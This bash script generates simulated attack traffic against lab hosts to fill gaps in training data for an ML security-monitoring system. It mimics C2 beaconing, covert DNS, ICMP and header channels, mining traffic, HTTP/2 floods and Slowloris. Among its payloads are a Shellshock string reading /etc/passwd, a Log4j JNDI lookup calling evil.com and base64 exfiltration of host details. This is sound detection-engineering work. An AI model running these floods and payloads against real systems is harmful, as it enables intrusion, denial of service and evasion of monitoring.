#!/bin/bash
###############################################################################
# GAP ATTACKS - Filling ML Training Data Gaps
# Attack patterns underrepresented in current dataset
#
# Categories:
#   1. Malware C2 simulation (Cobalt Strike, Meterpreter, etc.)
#   2. Encrypted channel abuse
#   3. Protocol abuse (HTTP/2, WebSocket, gRPC)
#   4. Cryptomining simulation
#   5. Advanced beaconing patterns
#   6. Anomalous traffic patterns
###############################################################################

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../configs/targets.conf" 2>/dev/null || true

# Targets
DVWA_IP="${DVWA_IP:-10.10.40.10}"
METASPLOIT_IP="${METASPLOIT_IP:-10.10.40.20}"
WINDOWS_IP="${WINDOWS_IP:-10.10.40.21}"
WORDPRESS_IP="${WORDPRESS_IP:-10.10.40.30}"
CRAPI_IP="${CRAPI_IP:-10.10.40.31}"
AD_DC_IP="${AD_DC_IP:-10.10.30.40}"
LHOST="10.10.20.20"

RESULTS="/home/butcher/soc-ml/attacks/results"
mkdir -p "$RESULTS"

#=============================================================================
# 1. MALWARE C2 SIMULATION
# Simulate traffic patterns of common malware/C2 frameworks
#=============================================================================

cobalt_strike_beacon() {
    local target="${1:-$DVWA_IP}"
    local port="${2:-443}"
    echo "[GAP] Cobalt Strike beacon simulation: $target:$port"

    # CS uses specific HTTP patterns with malleable C2
    # Default profile uses /submit.php, /pixel.gif, etc.
    CS_PATHS=("/submit.php" "/pixel.gif" "/__utm.gif" "/ga.js" "/fwlink"
              "/updates" "/activity" "/visit.js" "/load")

    for i in {1..50}; do
        path="${CS_PATHS[$RANDOM % ${#CS_PATHS[@]}]}"

        # Beacon check-in with CS-like headers
        curl -s -k "https://$target:$port$path" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Language: en-US,en;q=0.5" \
            -H "Cookie: SESSIONID=$(openssl rand -hex 16)" \
            --connect-timeout 2 > /dev/null 2>&1

        # Variable sleep (2-10 seconds with jitter - CS default)
        sleep $(( (RANDOM % 8) + 2 ))
    done
}

cobalt_strike_stager() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Cobalt Strike stager download simulation: $target"

    # CS stager typically downloads ~200KB shellcode
    # Simulating the download pattern
    STAGER_PATHS=("/updates.rss" "/static/style.css" "/jquery.min.js"
                  "/analytics.js" "/beacon.dll")

    for path in "${STAGER_PATHS[@]}"; do
        curl -s "http://$target$path" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" \
            -o /dev/null 2>&1
    done
}

meterpreter_https() {
    local target="${1:-$METASPLOIT_IP}"
    local port="${2:-8443}"
    echo "[GAP] Meterpreter HTTPS simulation: $target:$port"

    # Meterpreter uses specific TLS patterns and URI checksums
    for i in {1..30}; do
        # Generate Meterpreter-like URI (4-char checksum)
        uri=$(openssl rand -hex 2)

        curl -s -k "https://$target:$port/$uri" \
            -X POST \
            -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" \
            -H "Content-Type: application/octet-stream" \
            -d "$(openssl rand -base64 256)" \
            --connect-timeout 2 > /dev/null 2>&1

        sleep $(( (RANDOM % 5) + 1 ))
    done
}

meterpreter_reverse_tcp() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[GAP] Meterpreter reverse TCP pattern simulation: $target"

    # Attempt connections on common Meterpreter ports
    PORTS=(4444 4445 4446 5555 6666 8080 8443 9999)

    for port in "${PORTS[@]}"; do
        # Simulate the initial stage request
        echo -ne "\x00\x00\x00\x00" | nc -w 2 "$target" "$port" 2>/dev/null &
        sleep 0.5
    done
    wait
}

empire_stager() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] PowerShell Empire stager simulation: $target"

    # Empire uses specific HTTP patterns
    EMPIRE_PATHS=("/admin/get.php" "/news.php" "/login/process.php"
                  "/index.asp" "/default.aspx")

    for i in {1..30}; do
        path="${EMPIRE_PATHS[$RANDOM % ${#EMPIRE_PATHS[@]}]}"
        session_id=$(openssl rand -base64 32 | tr -d '/+=' | head -c 20)

        curl -s "http://$target$path" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)" \
            -H "Cookie: session=$session_id" \
            -H "Accept-Encoding: gzip, deflate" \
            > /dev/null 2>&1

        sleep $(( (RANDOM % 10) + 5 ))
    done
}

mythic_c2_http() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Mythic C2 HTTP simulation: $target"

    # Mythic uses JSON-based communication
    for i in {1..30}; do
        task_id=$(openssl rand -hex 8)

        # Check-in
        curl -s "http://$target/api/v1/agent/checkin" \
            -H "Content-Type: application/json" \
            -H "User-Agent: Mozilla/5.0" \
            -d "{\"action\":\"checkin\",\"uuid\":\"$task_id\"}" \
            > /dev/null 2>&1

        # Get tasking
        curl -s "http://$target/api/v1/agent/tasking" \
            -H "Content-Type: application/json" \
            -d "{\"action\":\"get_tasking\",\"uuid\":\"$task_id\"}" \
            > /dev/null 2>&1

        sleep $(( (RANDOM % 8) + 2 ))
    done
}

havoc_demon() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Havoc C2 Demon simulation: $target"

    # Havoc uses specific endpoints
    for i in {1..30}; do
        agent_id=$(openssl rand -hex 8)

        curl -s "http://$target/" \
            -X POST \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "$(openssl rand -base64 128)" \
            > /dev/null 2>&1

        sleep $(( (RANDOM % 6) + 2 ))
    done
}

#=============================================================================
# 2. ENCRYPTED CHANNEL ABUSE
# TLS to unusual ports, certificate anomalies, JA3 variations
#=============================================================================

tls_nonstandard_ports() {
    local target="${1:-$WINDOWS_IP}"
    echo "[GAP] TLS on non-standard ports: $target"

    # Malware often uses TLS on unusual ports
    PORTS=(8443 8080 9443 4443 1443 10443 444 447 448 449
           8888 9999 7443 6443 5443 3443 2443)

    for port in "${PORTS[@]}"; do
        echo | openssl s_client -connect "$target:$port" \
            -servername "$target" \
            -brief 2>/dev/null &
        sleep 0.2
    done
    wait
}

tls_cert_anomalies() {
    local target="${1:-$WINDOWS_IP}"
    echo "[GAP] TLS with anomalous client behavior: $target"

    # Self-signed cert acceptance, old TLS versions
    for port in 443 8443; do
        # TLS 1.0 (deprecated)
        echo | openssl s_client -connect "$target:$port" \
            -tls1 2>/dev/null || true

        # TLS 1.1 (deprecated)
        echo | openssl s_client -connect "$target:$port" \
            -tls1_1 2>/dev/null || true

        # No SNI (suspicious)
        echo | openssl s_client -connect "$target:$port" \
            -noservername 2>/dev/null || true

        # Specific cipher suites (weak)
        echo | openssl s_client -connect "$target:$port" \
            -cipher 'RC4-SHA' 2>/dev/null || true
    done
}

tls_beaconing_jitter() {
    local target="${1:-$DVWA_IP}"
    local port="${2:-443}"
    echo "[GAP] TLS beaconing with jitter patterns: $target:$port"

    # Different jitter patterns seen in malware
    # Pattern 1: Fixed interval (obvious)
    for i in {1..10}; do
        curl -s -k "https://$target:$port/" \
            -H "User-Agent: Mozilla/5.0" > /dev/null 2>&1
        sleep 5
    done

    # Pattern 2: Jitter 0-50% (CS default)
    for i in {1..10}; do
        curl -s -k "https://$target:$port/" > /dev/null 2>&1
        base=5
        jitter=$(( RANDOM % (base / 2) ))
        sleep $(( base + jitter ))
    done

    # Pattern 3: Random long sleep (evasive)
    for i in {1..5}; do
        curl -s -k "https://$target:$port/" > /dev/null 2>&1
        sleep $(( (RANDOM % 60) + 30 ))
    done
}

#=============================================================================
# 3. PROTOCOL ABUSE
# HTTP/2, WebSocket, gRPC abuse patterns
#=============================================================================

http2_flood() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] HTTP/2 flood attack: $target"

    # HTTP/2 multiplexing abuse
    if command -v h2load &> /dev/null; then
        h2load -n 1000 -c 10 -m 100 "https://$target/" 2>&1 || true
    else
        # Fall back to curl with HTTP/2
        for i in {1..100}; do
            curl -s --http2 "http://$target/" > /dev/null 2>&1 &
        done
        wait
    fi
}

http2_settings_flood() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] HTTP/2 SETTINGS frame flood: $target"

    # Rapid SETTINGS frames (CVE-2019-9512 pattern)
    for i in {1..50}; do
        curl -s --http2 --http2-prior-knowledge \
            "http://$target/" > /dev/null 2>&1 &
    done
    wait
}

websocket_abuse() {
    local target="${1:-$CRAPI_IP}"
    echo "[GAP] WebSocket abuse patterns: $target"

    # WebSocket upgrade attempts
    for i in {1..30}; do
        curl -s "http://$target/" \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
            -H "Sec-WebSocket-Version: 13" \
            > /dev/null 2>&1

        # WebSocket with payload
        curl -s "http://$target/ws" \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
            -H "Sec-WebSocket-Version: 13" \
            -d '{"type":"message","data":"test"}' \
            > /dev/null 2>&1
    done
}

grpc_probe() {
    local target="${1:-$CRAPI_IP}"
    local port="${2:-50051}"
    echo "[GAP] gRPC service probing: $target:$port"

    # gRPC uses HTTP/2 with specific content-type
    curl -s "http://$target:$port/" \
        -H "Content-Type: application/grpc" \
        -H "TE: trailers" \
        --http2-prior-knowledge \
        > /dev/null 2>&1

    # gRPC reflection
    if command -v grpcurl &> /dev/null; then
        grpcurl -plaintext "$target:$port" list 2>&1 || true
    fi
}

#=============================================================================
# 4. CRYPTOMINING SIMULATION
# Stratum protocol, pool traffic patterns
#=============================================================================

stratum_mining() {
    local pool="${1:-pool.target.local}"
    local port="${2:-3333}"
    echo "[GAP] Stratum mining protocol simulation"

    # Stratum protocol messages
    WORKER="worker1"

    # Simulate stratum handshake (sends to target for IDS detection)
    # These are the actual JSON-RPC messages miners send

    for target in "$DVWA_IP" "$METASPLOIT_IP"; do
        # Mining subscribe
        echo '{"id":1,"method":"mining.subscribe","params":["cpuminer/2.5.0"]}' | \
            nc -w 2 "$target" 3333 2>/dev/null &

        # Mining authorize
        echo "{\"id\":2,\"method\":\"mining.authorize\",\"params\":[\"$WORKER\",\"x\"]}" | \
            nc -w 2 "$target" 3333 2>/dev/null &

        # Mining submit (share)
        echo '{"id":3,"method":"mining.submit","params":["worker1","jobid","nonce"]}' | \
            nc -w 2 "$target" 3333 2>/dev/null &
    done
    wait

    # Also try common mining ports
    for port in 3333 4444 5555 7777 8888 9999 14433 14444; do
        echo '{"method":"login","params":{"login":"x","pass":"x"}}' | \
            nc -w 1 "$DVWA_IP" "$port" 2>/dev/null &
    done
    wait
}

xmrig_pattern() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] XMRig miner traffic pattern: $target"

    # XMRig uses specific JSON-RPC patterns
    for i in {1..20}; do
        # Keepalive
        curl -s "http://$target:3333" \
            -H "Content-Type: application/json" \
            -d '{"id":1,"jsonrpc":"2.0","method":"keepalived"}' \
            > /dev/null 2>&1

        # Job request
        curl -s "http://$target:3333" \
            -H "Content-Type: application/json" \
            -d '{"id":1,"jsonrpc":"2.0","method":"job","params":{"id":"worker"}}' \
            > /dev/null 2>&1

        sleep 2
    done
}

coinhive_pattern() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] CoinHive-style web mining traffic: $target"

    # Browser-based mining WebSocket patterns
    for i in {1..20}; do
        curl -s "http://$target/proxy" \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
            -d '{"type":"auth","params":{"site_key":"test","type":"anonymous"}}' \
            > /dev/null 2>&1

        curl -s "http://$target/proxy" \
            -d '{"type":"submit","params":{"job_id":"1","nonce":"test","result":"hash"}}' \
            > /dev/null 2>&1

        sleep 1
    done
}

#=============================================================================
# 5. ADVANCED BEACONING PATTERNS
# Various timing and encoding patterns seen in malware
#=============================================================================

beacon_workday_hours() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Work-hours beaconing pattern: $target"

    # Some malware only beacons during work hours
    # Simulate compressed beaconing
    for i in {1..30}; do
        curl -s "http://$target/" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            -H "X-Forwarded-For: 192.168.1.$((RANDOM % 254 + 1))" \
            > /dev/null 2>&1

        # 1-5 minute intervals
        sleep $(( (RANDOM % 240) + 60 ))
    done
}

beacon_base64_exfil() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Base64 encoded beacon exfiltration: $target"

    # Encode "commands" in base64 within legitimate-looking requests
    for i in {1..20}; do
        # Simulate command output exfil
        data=$(echo "hostname: $(hostname); id: $(id); date: $(date)" | base64 | tr -d '\n')

        curl -s "http://$target/api/track" \
            -H "Content-Type: application/json" \
            -d "{\"event\":\"pageview\",\"data\":\"$data\"}" \
            > /dev/null 2>&1

        # Cookie-based exfil
        curl -s "http://$target/" \
            -H "Cookie: _ga=$data" \
            > /dev/null 2>&1

        sleep 5
    done
}

beacon_dns_txt() {
    local target="${1:-$AD_DC_IP}"
    echo "[GAP] DNS TXT record beaconing: $target"

    # DNS TXT queries for C2 (common malware technique)
    for i in {1..50}; do
        # Encode data in subdomain
        data=$(openssl rand -hex 16)

        dig @"$target" "$data.beacon.local" TXT +short > /dev/null 2>&1
        dig @"$target" "$data.c2.target.local" TXT +short > /dev/null 2>&1
        dig @"$target" "$data.update.microsoft.com.local" TXT +short > /dev/null 2>&1

        sleep 2
    done
}

beacon_icmp_covert() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] ICMP covert channel beaconing: $target"

    # Data in ICMP payload
    for i in {1..30}; do
        # Encode data in ICMP packet payload
        data=$(echo "beacon:$i:$(date +%s)" | xxd -p)

        ping -c 1 -s 64 -p "${data:0:32}" "$target" > /dev/null 2>&1

        # Large ICMP (suspicious)
        ping -c 1 -s 1400 "$target" > /dev/null 2>&1

        sleep 3
    done
}

beacon_header_covert() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] HTTP header covert channel: $target"

    # Hide data in various HTTP headers
    for i in {1..30}; do
        cmd_id=$(openssl rand -hex 4)
        result=$(openssl rand -base64 32 | tr -d '\n')

        curl -s "http://$target/" \
            -H "X-Request-ID: $cmd_id" \
            -H "X-Correlation-ID: $result" \
            -H "X-Amz-Request-Id: $(openssl rand -hex 16)" \
            -H "X-Trace-Id: $(openssl rand -hex 8)" \
            -H "ETag: \"$result\"" \
            > /dev/null 2>&1

        sleep 5
    done
}

#=============================================================================
# 6. ANOMALOUS TRAFFIC PATTERNS
# Unusual but legitimate-looking traffic that should be detected
#=============================================================================

large_post_requests() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Anomalously large POST requests: $target"

    # Large uploads that could be exfiltration
    for size in 1 5 10 25 50; do
        dd if=/dev/urandom bs=1M count=$size 2>/dev/null | \
            curl -s -X POST "http://$target/upload" \
                -H "Content-Type: application/octet-stream" \
                --data-binary @- > /dev/null 2>&1
    done
}

high_frequency_requests() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] High-frequency request flood: $target"

    # Rapid requests (automated behavior)
    for i in {1..200}; do
        curl -s "http://$target/api/endpoint$((RANDOM % 100))" > /dev/null 2>&1 &

        # Launch in batches of 50
        if (( i % 50 == 0 )); then
            wait
        fi
    done
    wait
}

user_agent_anomalies() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Anomalous User-Agent patterns: $target"

    # Malware and tool user agents
    AGENTS=(
        "python-requests/2.25.1"
        "curl/7.68.0"
        "Wget/1.20.3"
        "Java/1.8.0_181"
        "Go-http-client/1.1"
        "Ruby"
        "libwww-perl/6.43"
        "Powershell/7.0"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
        ""  # Empty UA
        "() { :; }; /bin/bash -c 'cat /etc/passwd'"  # Shellshock in UA
        "sqlmap/1.4.7#stable"
        "Nikto/2.1.6"
        "Nmap Scripting Engine"
        "masscan/1.0"
        "zgrab/0.x"
        "${jndi:ldap://evil.com/a}"  # Log4j
    )

    for ua in "${AGENTS[@]}"; do
        curl -s "http://$target/" -A "$ua" > /dev/null 2>&1
    done
}

referer_anomalies() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Anomalous Referer patterns: $target"

    # Suspicious referers
    REFERERS=(
        ""
        "http://evil.com/malware.exe"
        "http://localhost/"
        "http://127.0.0.1/"
        "file:///etc/passwd"
        "javascript:alert(1)"
        "http://192.168.1.1/"
        "http://10.0.0.1/"
    )

    for ref in "${REFERERS[@]}"; do
        curl -s "http://$target/" -H "Referer: $ref" > /dev/null 2>&1
    done
}

port_knocking_pattern() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[GAP] Port knocking sequence: $target"

    # Simulate port knock sequences
    SEQUENCES=(
        "7000 8000 9000"
        "1234 5678 9012"
        "22 80 443 22"
    )

    for seq in "${SEQUENCES[@]}"; do
        for port in $seq; do
            nc -w 1 -z "$target" "$port" 2>/dev/null &
        done
        wait
        sleep 1
    done
}

long_connection_hold() {
    local target="${1:-$DVWA_IP}"
    local port="${2:-80}"
    echo "[GAP] Long HTTP connection hold: $target"

    # Slowloris-style partial requests
    for i in {1..10}; do
        (
            exec 3<>/dev/tcp/$target/$port 2>/dev/null || exit
            echo -e "GET / HTTP/1.1\r\nHost: $target\r\n" >&3
            sleep 30
            exec 3>&-
        ) &
    done
    wait
}

#=============================================================================
# 7. MALICIOUS DOWNLOAD PATTERNS
# Simulating malware download behaviors
#=============================================================================

exe_download_pattern() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Executable download patterns: $target"

    # Request patterns that look like malware downloads
    EXTS=("exe" "dll" "scr" "bat" "ps1" "vbs" "hta" "jar" "msi")

    for ext in "${EXTS[@]}"; do
        curl -s "http://$target/update.$ext" > /dev/null 2>&1
        curl -s "http://$target/installer.$ext" > /dev/null 2>&1
        curl -s "http://$target/setup.$ext" > /dev/null 2>&1
    done
}

staged_download() {
    local target="${1:-$DVWA_IP}"
    echo "[GAP] Staged payload download pattern: $target"

    # Stage 1: Small dropper
    curl -s "http://$target/1.txt" > /dev/null 2>&1
    sleep 2

    # Stage 2: Configuration
    curl -s "http://$target/config.dat" > /dev/null 2>&1
    sleep 2

    # Stage 3: Full payload
    curl -s "http://$target/payload.bin" > /dev/null 2>&1
}

#=============================================================================
# MAIN - Allow direct invocation
#=============================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 1 ]]; then
        echo "Usage: $0 <function_name> [args...]"
        echo ""
        echo "Available functions:"
        echo "  C2 Simulation:"
        echo "    cobalt_strike_beacon, cobalt_strike_stager, meterpreter_https"
        echo "    meterpreter_reverse_tcp, empire_stager, mythic_c2_http, havoc_demon"
        echo ""
        echo "  Encrypted Channels:"
        echo "    tls_nonstandard_ports, tls_cert_anomalies, tls_beaconing_jitter"
        echo ""
        echo "  Protocol Abuse:"
        echo "    http2_flood, http2_settings_flood, websocket_abuse, grpc_probe"
        echo ""
        echo "  Cryptomining:"
        echo "    stratum_mining, xmrig_pattern, coinhive_pattern"
        echo ""
        echo "  Beaconing:"
        echo "    beacon_workday_hours, beacon_base64_exfil, beacon_dns_txt"
        echo "    beacon_icmp_covert, beacon_header_covert"
        echo ""
        echo "  Anomalies:"
        echo "    large_post_requests, high_frequency_requests, user_agent_anomalies"
        echo "    referer_anomalies, port_knocking_pattern, long_connection_hold"
        echo ""
        echo "  Downloads:"
        echo "    exe_download_pattern, staged_download"
        exit 1
    fi

    func="$1"
    shift
    "$func" "$@"
fi
